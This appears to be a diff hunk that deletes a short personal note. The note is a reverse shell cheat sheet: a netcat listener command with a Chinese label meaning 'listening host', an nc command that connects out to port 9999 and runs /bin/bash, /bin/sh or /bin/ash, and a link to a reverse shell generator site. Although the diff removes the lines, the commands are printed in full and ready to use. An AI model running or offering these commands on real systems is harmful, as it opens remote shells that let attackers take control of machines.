@@ -1,5 +1,0 @@
-nc -lvvp 9999  监听主机
-nc 127.0.0.1 9999 -e /bin/bash | -e /bin/sh | -e /bin/ash
-#cd /bin | grep sh
-
-https://www.revshells.com/
